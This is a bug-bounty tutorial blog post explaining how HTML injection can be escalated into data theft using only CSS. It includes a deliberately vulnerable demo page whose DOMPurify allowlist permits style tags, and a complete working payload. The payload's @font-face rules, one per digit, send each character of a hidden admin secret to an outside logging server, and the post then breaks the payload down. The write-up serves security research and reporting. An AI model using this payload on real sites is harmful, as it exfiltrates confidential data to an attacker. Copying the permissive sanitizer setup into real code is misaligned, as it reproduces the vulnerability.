+++
title = 'HTML Injection to Data Exfiltration: Weaponizing CSS'
date = 2026-01-22T16:15:15+05:30
draft = false
aliases = ['HTML-Injection-to-Data-Exfiltration-Weaponizing-CSS']
+++

> 🐞 Found HTML Injection ? Don’t Stop There.
> 
> Most bug bounty programs label **HTML Injection** as _Low_ or _Medium_ severity 🤷‍♂️
> Why? Because on its own, it’s often considered **low impact** and _non-exploitable_.
> 
> But what if HTML Injection alone could be escalated to HIGH severity 🚨 — By exfiltrating sensitive data using only CSS, with no JavaScript or XSS?

Assume there are 2 roles in web application which is vulnerable to HTML Injection — guest, admin.

A Guest user can inject an HTML payload (stored or reflected) that is rendered by an Admin, resulting in sensitive information disclosure and vertical privilege escalation.
The same technique can also work within the same role (horizontal privilege escalation and data exfiltration), though the severity is typically lower and depends on the sensitivity of the data leaked.

**Vulnerable Scenario**:

```
<!DOCTYPE html>
<html>
<head>
  <title>CSS Exfiltration Challenge</title>
  <script src="https://cdn.jsdelivr.net/npm/dompurify@3.0.6/dist/purify.min.js"></script>
  <style>
    body {
      font-family: system-ui, sans-serif;
    }
    #secret {
      display: none;
    }
  </style>
</head>
<body>
<h2>Exfil the secret</h2>
<div>Secret visible to admin only:</div>
<div id="secret">1269</div>
<textarea id="input" rows="6" cols="70"
  placeholder="Enter formatted notes (HTML allowed, JS blocked)">
</textarea>
<br><br>
<button onclick="render()">Save</button>
<hr>
<div id="preview"></div>
<script>
const STORAGE_KEY = "stored_note";
function sanitizeAndRender(value) {
  const clean = DOMPurify.sanitize(value, {
    ALLOWED_TAGS: [      "a","abbr","acronym","address","area","article","aside","audio",
      "b","bdi","bdo","big","blink","blockquote","body","br","button",
      "canvas","caption","center","cite","code","col","colgroup","content",
      "data","datalist","dd","decorator","del","details","dfn","dialog",
      "dir","div","dl","dt","element","em","fieldset","figcaption","figure",
      "font","footer","form","h1","h2","h3","h4","h5","h6","head","header",
      "hgroup","hr","html","i","img","input","ins","kbd","label","legend",
      "li","main","map","mark","marquee","menu","menuitem","meter","nav",
      "nobr","ol","optgroup","option","output","p","picture","pre","progress",
      "q","rp","rt","ruby","s","samp","section","select","shadow","small",
      "source","spacer","span","strike","strong","style","sub","summary",
      "sup","table","tbody","td","template","textarea","tfoot","th","thead",
      "time","tr","track","tt","u","ul","var","video","wbr"
    ],
    FORCE_BODY: true
  });
  document.getElementById("preview").innerHTML = clean;
}
function render() {
  const value = document.getElementById("input").value;
  // Persist raw input (simulates DB storage)
  localStorage.setItem(STORAGE_KEY, value);
  sanitizeAndRender(value);
}
// Auto‑load on page refresh
window.addEventListener("DOMContentLoaded", () => {
  const saved = localStorage.getItem(STORAGE_KEY);
  if (saved) {
    document.getElementById("input").value = saved;
    sanitizeAndRender(saved);
  }
});
</script>
</body>
</html>
```

**Payload** —

```
<style>
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=1");
  unicode-range: U+31;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=2");
  unicode-range: U+32;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=3");
  unicode-range: U+33;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=4");
  unicode-range: U+34;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=5");
  unicode-range: U+35;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=6");
  unicode-range: U+36;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=7");
  unicode-range: U+37;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=8");
  unicode-range: U+38;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=9");
  unicode-range: U+39;
}
* {
  font-family: sans-serif !important;
}
#secret {
  display: block !important;
  font-family: "leak" !important;
  color: red !important;
}
</style>
```

**Breaking down of payload** -

```
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=1");
  unicode-range: U+31;
}
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=2");
  unicode-range: U+32;
}
.
.
.
@font-face {
  font-family: "leak";
  src: url("https://jayateerthag.in/log?char=9");
  unicode-range: U+39;
}
```

The above code defines a custom font-family leak and maps each character to a remote font URL such as
[https://jayateerthag.in/log?char=1](https://jayateerthag.in/log?char=1).

> In this example, the URL is associated with the Unicode character 1 (U+0031). When this character appears in the target text node from which data needs to be exfiltrated, the browser loads the corresponding font file — triggering an HTTP request to [https://jayateerthag.in/log?char=1](https://jayateerthag.in/log?char=1) and leaking that character.
> 
> Similarly mapping applies to all other characters as well, with each character pointing to its own URL, allowing the entire value to be exfiltrated character by character.

```
* {
 font-family: sans-serif !important;
}
```

This rule **forces all text to use the default sans-serif font**, ensuring that only the explicitly targeted text uses the custom leak font. This helps **prevent accidental exfiltration of unintended text** content elsewhere on the page.

```
#secret {
  display: block !important;
  font-family: "leak" !important;
  color: red !important;
}
```

This rule explicitly targets the **#secret** node, forces its **font-family** to **leak**, **makes it visible** (display: block) to ensure the font is rendered, and sets color to red for clarity.
**Once rendered, the browser loads the corresponding font resources, allowing the character-by-character data exfiltration to the attacker’s server.**

![](/post/img/2026-01-22-css-data-exfil.png)

**Note**: Request is sent in parallel in undefined order, while secret is 1269, request is sent as 9621.

> **🎯 Closing Note**
> **Always focus on impact, not just vulnerability type.**
> 
> **Even a seemingly low-severity issue like HTML Injection can be escalated into a high-impact finding when combined with creative exploitation techniques.**
> 
> **Show the impact, tell the story, drop the report — then log off, grab a pillow, and enjoy sleeping on a pile of bounty 💰**

**Liked my article ? Follow me on** [**LinkedIn**](https://www.linkedin.com/in/jayateerthag/)**, Twitter (**[**@jayateerthaG**](https://twitter.com/jayateerthag)**), and** [**Medium**](https://medium.com/) **for more content about bugbounty, Infosec, cybersecurity and hacking.**
